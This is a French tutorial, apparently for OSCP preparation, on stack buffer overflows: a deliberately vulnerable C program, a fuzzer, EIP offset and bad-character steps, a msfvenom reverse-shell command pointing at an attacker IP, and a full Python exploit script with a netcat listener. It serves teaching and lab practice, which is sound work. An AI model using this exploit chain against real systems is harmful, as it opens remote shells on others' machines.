# Buffer Overflow : comprendre et exploiter les débordements de tampon

Le buffer overflow est l'une des vulnérabilités les plus classiques et les plus fondamentales en sécurité informatique. Présente depuis les années 1980, elle reste d'actualité et est obligatoire pour l'examen OSCP. Ce guide explique le mécanisme de fond en comble.

## Qu'est-ce qu'un buffer overflow ?

```c
// Programme C vulnérable
#include <stdio.h>
#include <string.h>

void fonction_vulnerable(char *input) {
    char buffer[64];  // Tampon de 64 octets
    strcpy(buffer, input);  // strcpy ne vérifie pas la taille !
    printf("Vous avez saisi : %s\n", buffer);
}

int main() {
    char user_input[256];
    gets(user_input);  // gets() ne limite pas non plus !
    fonction_vulnerable(user_input);
    return 0;
}

// Si input > 64 octets → débordement dans la pile (stack)
// Les octets supplémentaires écrasent d'autres données en mémoire
```

## La mémoire du programme (Stack)

```
Organisation de la pile lors d'un appel de fonction :

Adresses hautes
┌─────────────────────────┐
│   Arguments de main()   │
├─────────────────────────┤
│   Adresse de retour     │  ← EIP/RIP (où reprendre après return)
├─────────────────────────┤
│   Saved EBP/RBP         │  ← Base Pointer sauvegardé
├─────────────────────────┤
│                         │
│   buffer[64]            │  ← Notre buffer (croît vers le haut)
│                         │
└─────────────────────────┘
Adresses basses

Si on écrit > 64 octets dans buffer :
→ On écrase EBP sauvegardé
→ On écrase l'ADRESSE DE RETOUR !
→ Contrôle du flux d'exécution du programme
```

## Les étapes d'exploitation

### Étape 1 : Fuzzing — trouver le crash

```python
#!/usr/bin/env python3
# fuzzer.py - Trouver la taille exacte qui cause le crash

import socket
import time

ip = "192.168.1.100"
port = 9999
timeout = 5

# Envoyer des buffers de taille croissante
buffer = b"A" * 100

while True:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            s.connect((ip, port))
            s.recv(1024)
            print(f"[*] Envoi de {len(buffer)} octets...")
            s.send(buffer + b"\r\n")
            s.recv(1024)
    except Exception as e:
        print(f"[!] CRASH probable à {len(buffer)} octets !")
        break

    time.sleep(1)
    buffer += b"A" * 100
```

### Étape 2 : Contrôler EIP — trouver l'offset exact

```bash
# Générer un pattern unique avec Metasploit
msf-pattern_create -l 2400
# Génère : Aa0Aa1Aa2Aa3Aa4Aa5...

# Envoyer le pattern au programme vulnérable
# Quand il crash, noter la valeur dans EIP (ex: 6f43396e)

# Trouver l'offset exact
msf-pattern_offset -l 2400 -q 6f43396e
# [*] Exact match at offset 1978
# EIP est écrasé après 1978 octets exactement !
```

```python
# Vérifier le contrôle d'EIP
import socket

ip = "192.168.1.100"
port = 9999
offset = 1978

buffer  = b"A" * offset          # Remplissage jusqu'à EIP
buffer += b"BBBB"                 # EIP = 0x42424242 (BBBB) → on contrôle !
buffer += b"C" * (2400 - offset - 4)  # Après EIP

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((ip, port))
    s.recv(1024)
    s.send(buffer + b"\r\n")

# Si EIP = 42424242 dans le debugger → CONTRÔLE CONFIRMÉ !
```

### Étape 3 : Trouver les bad characters

```python
# Certains octets sont "mauvais" et tronquent le buffer
# \x00 (null byte), \x0a (newline), \x0d (carriage return)...

# Générer tous les octets de \x01 à \xff
badchars = b"".join(bytes([i]) for i in range(1, 256))

buffer  = b"A" * offset
buffer += b"BBBB"
buffer += badchars  # Observer dans le debugger quels octets sont manquants

# Dans Immunity Debugger / x64dbg :
# Chercher la chaîne dans la pile → voir où elle est tronquée
# L'octet manquant = bad character
```

### Étape 4 : Trouver un JMP ESP

```bash
# EIP doit pointer vers notre shellcode
# Notre shellcode est dans ESP (après EIP dans la pile)
# Solution : trouver une instruction JMP ESP dans un module

# Dans Immunity Debugger avec Mona.py
!mona jmp -r esp -cpb "\x00\x0a\x0d"
# -cpb : caractères à éviter (bad chars)
# Résultat : 0x625011af → adresse d'un JMP ESP sans bad chars

# Dans x64dbg :
# Chercher "FFE4" (opcode de JMP ESP) dans les modules
```

### Étape 5 : Générer le shellcode

```bash
# msfvenom - Générer un reverse shell
msfvenom -p windows/shell_reverse_tcp \
    LHOST=192.168.1.50 \
    LPORT=4444 \
    -b "\x00\x0a\x0d" \          # Bad chars à éviter
    -f python \
    -v shellcode

# Résultat :
# shellcode =  b""
# shellcode += b"\xda\xca\xb8\xf2\x03\xa4\x0a\xd9\x74\x24\xf4"
# ...
```

### Étape 6 : Exploit final

```python
#!/usr/bin/env python3
# exploit.py - Exploit BOF complet

import socket

ip = "192.168.1.100"
port = 9999

offset = 1978
jmp_esp = b"\xaf\x11\x50\x62"  # 0x625011af en little-endian
nop_sled = b"\x90" * 16  # NOP sled (atterrissage souple)

# Shellcode généré par msfvenom
shellcode  = b""
shellcode += b"\xda\xca\xb8\xf2\x03\xa4\x0a\xd9\x74\x24\xf4"
shellcode += b"\x5b\x29\xc9\xb1\x52\x31\x43\x17\x03\x43\x17"
# ... (shellcode complet)

buffer  = b"A" * offset      # Remplissage
buffer += jmp_esp             # EIP → JMP ESP → notre shellcode
buffer += nop_sled            # NOP sled pour absorber les petites erreurs
buffer += shellcode           # Reverse shell

print(f"[*] Envoi de l'exploit ({len(buffer)} octets)...")

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((ip, port))
    s.recv(1024)
    s.send(buffer + b"\r\n")

print("[*] Exploit envoyé ! Attente du reverse shell...")

# Sur la machine attaquante :
# nc -lvnp 4444
# → Shell sur la machine vulnérable !
```

## Protections modernes contre les BOF

```
ASLR (Address Space Layout Randomization) :
→ Randomise les adresses mémoire à chaque exécution
→ JMP ESP à une adresse différente à chaque fois
→ Bypass : information leak, brute force (32-bit), heap spray

DEP/NX (Data Execution Prevention / No-Execute) :
→ La pile n'est pas exécutable
→ Le shellcode en pile ne peut pas s'exécuter
→ Bypass : Return-Oriented Programming (ROP)

Stack Canaries :
→ Valeur aléatoire entre buffer et EIP
→ Vérifiée avant le return → si modifiée → arrêt
→ Bypass : information leak du canary

SafeSEH / SEHOP :
→ Protection des gestionnaires d'exceptions (SEH)
→ Vérifie l'intégrité de la chaîne SEH
```

## BOF en 2024 — Où ça existe encore ?

```
Domaines encore vulnérables :

Systèmes embarqués (IoT) :
→ Routeurs, cameras IP, SCADA/ICS
→ Pas de ASLR/DEP sur systèmes anciens
→ Langages C sans protections

Applications legacy :
→ Logiciels industriels datant des années 90-2000
→ Protocoles réseau custom (Modbus, BACnet)
→ Firmware non mis à jour

CTF et OSCP :
→ La compétence reste exigée pour OSCP
→ Machines Vulnhub/HackTheBox avec BOF volontaires
→ Buffer Overflow 32-bit = partie obligatoire de l'examen OSCP
```

## Ressources pour apprendre

```bash
# Environnement de pratique
# Vulnserver (Windows) - BOF volontairement vulnérable
# https://github.com/stephenbradshaw/vulnserver

# Protostar (Linux) - Série de challenges BOF progressifs
# https://exploit.education/protostar/

# TryHackMe - Buffer Overflow Prep room
# https://tryhackme.com/room/bufferoverflowprep

# Pwndbg - Debugger GDB amélioré pour l'exploitation
pip install pwndbg
# Commandes : checksec, vmmap, stack, cyclic

# Pwntools - Bibliothèque Python pour l'exploitation
pip install pwntools
from pwn import *
# p = remote('192.168.1.100', 9999)
# p.sendline(b'A' * offset + jmp_esp + shellcode)
```

## Conclusion

Le buffer overflow illustre les conséquences catastrophiques d'un simple manque de vérification de taille. Aujourd'hui, les protections (ASLR, DEP, canaries) rendent les exploitations plus complexes mais pas impossibles. La meilleure défense reste d'utiliser des langages sûrs (Rust, Go) ou des fonctions sécurisées (`strncpy` plutôt que `strcpy`, `fgets` plutôt que `gets`). Pour tout pentester, maîtriser le BOF basique reste incontournable — c'est obligatoire pour l'OSCP.

---
*Article suivant : [CTF : compétitions de hacking éthique](../articles/ctf-competitions)*
